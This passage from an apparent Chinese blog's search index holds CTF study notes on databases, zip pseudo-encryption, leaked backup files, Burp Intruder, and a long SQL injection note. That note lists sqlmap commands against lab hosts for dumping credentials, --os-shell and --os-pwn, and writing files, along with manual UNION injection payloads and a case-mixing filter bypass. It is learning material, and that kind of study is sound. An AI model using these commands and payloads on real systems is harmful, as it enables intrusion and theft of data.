      <link href="/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
      <url>/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="foreign-key用法详解"><a href="#foreign-key用法详解" class="headerlink" title="foreign key用法详解"></a>foreign key用法详解</h1><h2 id="引子：把所有数据都存放于一张表的弊端"><a href="#引子：把所有数据都存放于一张表的弊端" class="headerlink" title="引子：把所有数据都存放于一张表的弊端"></a>引子：把所有数据都存放于一张表的弊端</h2><ol><li>组织结构复杂比清晰</li><li>浪费空间</li><li>拓展性差</li></ol><h2 id="表和表之间存在的三种关系"><a href="#表和表之间存在的三种关系" class="headerlink" title="表和表之间存在的三种关系"></a>表和表之间存在的三种关系</h2><ol><li>一对多</li><li>多对多</li><li>一对一</li></ol><h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><ol><li>先站在表emp的角度</li><li>去找表emp的多条记录能否对应表dep的一条记录。</li><li>翻译2的意义：</li><li>左表emp的多条记录==》多个员工</li><li>右表dep的一条记录==》一个部门</li><li>最终翻译结果：多个员工是否可以属于一个部门？</li><li>如果是则需要进行part2的流程</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip伪加密</title>
      <link href="/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/"/>
      <url>/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="参考博客地址"><a href="#参考博客地址" class="headerlink" title="参考博客地址"></a>参考博客地址</h1><ol><li><a href="https://www.cnblogs.com/cute-puli/p/16042101.html">https://www.cnblogs.com/cute-puli/p/16042101.html</a></li></ol><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><h2 id="010或者winhex"><a href="#010或者winhex" class="headerlink" title="010或者winhex"></a>010或者winhex</h2><ol><li>建议使用010editor</li><li>因为可以自动区分数据区，目录区和目录结束标志<h3 id="zip文件组成"><a href="#zip文件组成" class="headerlink" title="zip文件组成"></a>zip文件组成</h3></li><li>压缩源文件数据区</li><li>压缩源文件目录区</li><li>压缩源文件目录结束标志</li></ol><h1 id="奇数为加密，偶数为不加密"><a href="#奇数为加密，偶数为不加密" class="headerlink" title="奇数为加密，偶数为不加密"></a>奇数为加密，偶数为不加密</h1><h1 id="无加密："><a href="#无加密：" class="headerlink" title="无加密："></a>无加密：</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录区的全局方式位标记应为00 00</li></ol><h1 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录区的全局加密方式应为 00 90</li></ol><h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录去的全局方式应为00 90</li></ol><p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</p><p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><p>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> zip伪加密 </category>
          
          <category> 文件修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 文件修复 </tag>
            
            <tag> zip伪加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息泄露</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h1 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h1><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><h2 id="bak文件下载"><a href="#bak文件下载" class="headerlink" title="bak文件下载"></a>bak文件下载</h2><ol><li>访问目录下的bak文件</li><li>题目提示source 在index.php下，所以用hackbar访问index.php.bak</li><li>将bak文件后缀改为txt或者用notepad++打开即可获得flag</li></ol><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><ol><li>vim会自动生成备份文件和临时文件</li><li>临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除</li><li>如果意外退出则会保留，名为.filename.swp</li><li>第一次产生的交换文件名为“.filename.txt.swp”；再次意外退出后，将会产生名为“.filename.txt.swo”的交换文件；而第三次产生的交换文件则为“.filename.txt.swn</li><li>因为这里已经告诉我们是index.php了，所以其意外退出而保留的临时文件是 .index.php.swp</li></ol><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><ol><li>直接打开页面发现是phpinfo界面</li><li>思路是从表中搜索flag的信息</li><li>浏览器中ctrl+f查找（和wires hark相同）flag</li></ol><h1 id="信息泄露问题"><a href="#信息泄露问题" class="headerlink" title="信息泄露问题"></a>信息泄露问题</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><ol><li>用菜刀爬或者用御剑字典爆破搜就完了</li><li><a href="https://imgtu.com/i/H2keX9"><img src="https://s4.ax1x.com/2022/02/15/H2keX9.md.png" alt="H2keX9.md.png"></a></li><li>观察之间的不同</li><li>一开始我还以为c=d o=a之类的是将下部的challenge那一串替换，结果发现我想多了</li><li>里面有flag_in_here.txt，双击打开后发现了flag</li><li><a href="https://imgtu.com/i/H2AV4f"><img src="https://s4.ax1x.com/2022/02/15/H2AV4f.md.png" alt="H2AV4f.md.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息泄露 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit intruder的四种攻击方式</title>
      <link href="/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuit-intruder的四种攻击方式"><a href="#burpsuit-intruder的四种攻击方式" class="headerlink" title="burpsuit intruder的四种攻击方式"></a>burpsuit intruder的四种攻击方式</h1><h2 id="sniper狙击手模式"><a href="#sniper狙击手模式" class="headerlink" title="sniper狙击手模式"></a>sniper狙击手模式</h2><ol><li>使用一组payload集合，一次只使用一个payload位置<h2 id="battering-ram-攻城锤模式"><a href="#battering-ram-攻城锤模式" class="headerlink" title="battering ram 攻城锤模式"></a>battering ram 攻城锤模式</h2></li><li>只使用一个payload集合，每次攻击都是替换所有payload标记位置</li><li>与狙击手模式不同点在于狙击手每次只替换一个标记位置，而攻城锤替换所有的标记位置<h2 id="三Pitchfork（草叉模式）"><a href="#三Pitchfork（草叉模式）" class="headerlink" title="三Pitchfork（草叉模式）"></a>三Pitchfork（草叉模式）</h2><h2 id="四Cluster-bomb（集束炸弹模式）"><a href="#四Cluster-bomb（集束炸弹模式）" class="headerlink" title="四Cluster bomb（集束炸弹模式）"></a>四Cluster bomb（集束炸弹模式）</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h1><h2 id="判断是否能注入"><a href="#判断是否能注入" class="headerlink" title="判断是否能注入"></a>判断是否能注入</h2><ol><li>python sqlmap.py -u “url?id=1”<h2 id="找库"><a href="#找库" class="headerlink" title="找库"></a>找库</h2></li><li>python sqlmap.py -u “url?id=1” –dbs</li></ol><h2 id="找表"><a href="#找表" class="headerlink" title="找表"></a>找表</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 –tables</li></ol><h2 id="找列"><a href="#找列" class="headerlink" title="找列"></a>找列</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 –columns</li></ol><h2 id="dump掉信息"><a href="#dump掉信息" class="headerlink" title="dump掉信息"></a>dump掉信息</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 -C 列名 –dump</li><li>或者列名前加–columns</li></ol><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://www.cnblogs.com/ichunqiu/p/5805108.html">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></li></ol><h1 id="嗅探等级："><a href="#嗅探等级：" class="headerlink" title="嗅探等级："></a>嗅探等级：</h1><h2 id="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"><a href="#不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢" class="headerlink" title="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"></a>不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢</h2><h2 id="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"><a href="#当不能确定哪个payload时或参数作为注入点，可以使用较高的level值" class="headerlink" title="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"></a>当不能确定哪个payload时或参数作为注入点，可以使用较高的level值</h2><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><ol><li>http cookie测试</li></ol><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><ol><li>http user-agent/referer头回测试</li></ol><h1 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://blog.csdn.net/a_small_rabbit/article/details/101110011">https://blog.csdn.net/a_small_rabbit/article/details/101110011</a></li></ol><h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><ol><li>用burp抓包</li><li>将抓到的包保存为.txt文件类型(右击，copy to file)</li><li>sqlmap中的命令：sqlmap -r “admin.txt” -p n –dbs(-r表示加载一个文件，-p指定参数)</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 –tables</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 –columns</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 -C “username,password” –dump</li></ol><h2 id="指定参数（get传参来实现post注入）"><a href="#指定参数（get传参来实现post注入）" class="headerlink" title="指定参数（get传参来实现post注入）"></a>指定参数（get传参来实现post注入）</h2><ol><li>sqlmap -u “url” –data “n=1&amp;p=1” –dbs(与上面类似)</li><li>sqlmap -u “url” –data “username=1&amp;password=1” –dbs(假设参数是username和password)</li></ol><h2 id="r指定文件去暴库"><a href="#r指定文件去暴库" class="headerlink" title="-r指定文件去暴库"></a>-r指定文件去暴库</h2><ol><li>python sqlmap.py -r 文件路径+文件名.txt –dbs</li></ol><h2 id="forms"><a href="#forms" class="headerlink" title="-forms"></a>-forms</h2><ol><li>使用该命令，使sqlmap自己抓包</li><li>sqlmap -u “url” –forms –level=5 –dbs</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本小子 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 脚本小子 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n的二进制表示中第k位数字是几</title>
      <link href="/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/"/>
      <url>/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="n的二进制表示中第k位数字是几"><a href="#n的二进制表示中第k位数字是几" class="headerlink" title="n的二进制表示中第k位数字是几"></a>n的二进制表示中第k位数字是几</h1><ol><li>先把第k位数字移到最后一位 n&gt;&gt;k</li><li>看个位是几 x&amp;1<h2 id="除以2相当于二进制数右移1位"><a href="#除以2相当于二进制数右移1位" class="headerlink" title="除以2相当于二进制数右移1位"></a>除以2相当于二进制数右移1位</h2></li><li>即右移1位相当于除以2，相当于除去二进制数中的下一位<h2 id="按位与操作："><a href="#按位与操作：" class="headerlink" title="按位与操作："></a>按位与操作：</h2></li><li>相当于取出某一位</li><li>int a = 1010</li><li>a &amp; 1 = 0</li><li>a &amp; 11 = 2  (10的二进制表示为2)</li></ol><h1 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h1><ol><li>lowbit(x)是返回x的最后一位1</li><li>相当于x&amp;-x=x&amp;(~x+1)</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入漏洞</title>
      <link href="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><h2 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h2><ol><li>  <a href="https://www.anquanke.com/post/id/235846#h3-16">Sqlmap使用详解-安全客 - 安全资讯平台 (anquanke.com)</a></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r http.txt  <span class="token comment">#http.txt是我们抓取的http的请求包</span>sqlmap -r http.txt -p username  <span class="token comment">#指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span>sqlmap -u <span class="token string">"http://www.xx.com/username/admin*"</span>       <span class="token comment">#如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>   <span class="token comment">#探测该url是否存在漏洞</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>   --cookie<span class="token operator">=</span><span class="token string">"抓取的cookie"</span>   <span class="token comment">#当该网站需要登录时，探测该url是否存在漏洞</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>  --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span>  <span class="token comment">#抓取其post提交的数据填入</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --users      <span class="token comment">#查看数据库的所有用户</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --passwords  <span class="token comment">#查看数据库用户名的密码</span>有时候使用 --passwords 不能获取到密码，则可以试下-D mysql -T user -C host,user,password --dump  当MySQL<span class="token operator">&lt;</span> <span class="token number">5.7</span>时-D mysql -T user -C host,user,authentication_string --dump  当MySQL<span class="token operator">>=</span> <span class="token number">5.7</span>时sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --current-user  <span class="token comment">#查看数据库当前的用户</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --is-dba    <span class="token comment">#判断当前用户是否有管理员权限</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --roles     <span class="token comment">#列出数据库所有管理员角色，仅适用于oracle数据库的时候</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --dbs        <span class="token comment">#爆出所有的数据库</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --tables     <span class="token comment">#爆出所有的数据表</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --columns    <span class="token comment">#爆出数据库中所有的列</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --current-db <span class="token comment">#查看当前的数据库</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security --tables <span class="token comment">#爆出数据库security中的所有的表</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> --columns <span class="token comment">#爆出security数据库中users表中的所有的列</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> -C username --dump  <span class="token comment">#爆出数据库security中的users表中的username列中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> -C username --dump --start <span class="token number">1</span> --stop <span class="token number">100</span>  <span class="token comment">#爆出数据库security中的users表中的username列中的前100条数据</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> --dump-all <span class="token comment">#爆出数据库security中的users表中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security --dump-all   <span class="token comment">#爆出数据库security中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --dump-all  <span class="token comment">#爆出该数据库中的所有数据</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>  --tamper<span class="token operator">=</span>space2comment.py  <span class="token comment">#指定脚本进行过滤，用/**/代替空格</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --level<span class="token operator">=</span><span class="token number">5</span> --risk<span class="token operator">=</span><span class="token number">3</span> <span class="token comment">#探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --sql-shell  <span class="token comment">#执行指定的sql语句</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --os-shell/--os-cmd   <span class="token comment">#执行--os-shell命令，获取目标服务器权限</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --os-pwn   <span class="token comment">#执行--os-pwn命令，将目标权限弹到MSF上</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --file-read <span class="token string">"c:/test.txt"</span> <span class="token comment">#读取目标服务器C盘下的test.txt文件</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --file-write  test.txt  --file-dest <span class="token string">"e:/hack.txt"</span>  <span class="token comment">#将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --dbms<span class="token operator">=</span><span class="token string">"MySQL"</span>     <span class="token comment">#指定其数据库为mysql </span>其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDBsqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --random-agent   <span class="token comment">#使用任意的User-Agent爆破</span>sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --proxy<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8080"</span>    <span class="token comment">#指定代理</span>当爆破HTTPS网站会出现超时的话，可以使用参数 --delay<span class="token operator">=</span><span class="token number">3</span> --force-sslsqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --technique T    <span class="token comment">#指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span>支持的探测方式如下：　　B: Boolean-based blind SQL injection（布尔型注入）　　E: Error-based SQL injection（报错型注入）　　U: UNION query SQL injection（可联合查询注入）　　S: Stacked queries SQL injection（可多语句查询注入）　　T: Time-based blind SQL injection（基于时间延迟注入）sqlmap -d <span class="token string">"mysql://root:root@192.168.10.130:3306/mysql"</span> --os-shell   <span class="token comment">#知道网站的账号密码直接连接</span>-v3                   <span class="token comment">#输出详细度  最大值5 会显示请求包和回复包</span>--threads <span class="token number">5</span>           <span class="token comment">#指定线程数</span>--fresh-queries       <span class="token comment">#清除缓存</span>--flush-session       <span class="token comment">#清空会话，重构注入 </span>--batch               <span class="token comment">#对所有的交互式的都是默认的</span>--random-agent        <span class="token comment">#任意的http头</span>--tamper base64encode            <span class="token comment">#对提交的数据进行base64编码</span>--referer http://www.baidu.com   <span class="token comment">#伪造referer字段</span>--keep-alive     保持连接，当出现 <span class="token punctuation">[</span>CRITICAL<span class="token punctuation">]</span> connection dropped or unknown HTTP status code received. sqlmap is going to retry the request<span class="token punctuation">(</span>s<span class="token punctuation">)</span> 保错的时候，使用这个参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="information-schema的内容"><a href="#information-schema的内容" class="headerlink" title="information_schema的内容"></a>information_schema的内容</h2><ol><li><p>  SCHEMATA:提供当前mysql实例中所有<strong>数据库</strong>的信息，与show databases的结果相同</p></li><li><p>  TABLES:提供了关于数据库中表的信息，详细描述该表属于哪个schema</p></li><li><p>COLUMNS：提供了表的列信息，详细表述了某张表的所有列以及每个列的信息，与show columns from schemaname.tablename相同</p>  <pre class="line-numbers language-none"><code class="language-none">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。COLLATIONS表：提供了关于各字符集的对照信息。COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。KEY_COLUMN_USAGE表：描述了具有约束的键列。ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h2><ol><li>shcema可以看作是房间</li><li>table_schema是用来存放table表的房间，是数据库</li><li>table_name是表的名字</li><li>table_type是表的类型</li></ol><h2 id="SQL语句不区分大小写"><a href="#SQL语句不区分大小写" class="headerlink" title="SQL语句不区分大小写"></a>SQL语句不区分大小写</h2><ol><li><p>SQL语句不区分大小写，所以如果后端对某些关键词进行了过滤，可以使用大小写绕过</p>  <pre class="line-numbers language-none"><code class="language-none">SEleCT * FrOm Information_SchEma.SchematA;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h2><ol><li>group_concat可以将多行数据整合为一行</li><li>concat可以将不同数据用第一个参数链接</li><li>可以写group_concat(concat_ws(‘:’,id,email_id))</li></ol><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><h3 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h3><ol><li>1 and 1=1正确</li><li>1 and 1=2不正确，所以可以判断是整数型注入</li></ol><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><ol><li>order by 1,2,3,4….</li><li>可以使用二分法来判断</li><li>为下一步联合查询爆数据库名奠定基础</li><li>数据库ctf</li><li><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230528112808285.png" alt="image-20230528112808285"></li><li><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230528112918701.png" alt="image-20230528112918701"></li></ol><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol><li>?id=1 and 1=2 union select 1,database()</li><li>1’ and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata –+</li><li>注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致</li><li><a href="https://imgtu.com/i/HgvkKf"><img src="https://s4.ax1x.com/2022/02/15/HgvkKf.md.png" alt="HgvkKf.md.png"></a></li></ol><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><ol><li>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_name= ‘sqli’</li><li>group_concat()函数是用来将多行转为一行，将组中的字符串连接成为具有各种选项的单个字符串</li><li>table_name</li><li>information_schema.tables</li><li>1’ and 1=2 union select 1,2,group_concat(username) from ctfshow_web.ctfshow_users where id=1  –+</li></ol><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><ol><li>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’</li><li>column_name</li><li>information_schema.columns</li></ol><h3 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h3><ol><li>?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</li><li>根据库中的表来查询所有的列中带flag的</li><li><a href="https://imgtu.com/i/HgvAr8"><img src="https://s4.ax1x.com/2022/02/15/HgvAr8.md.png" 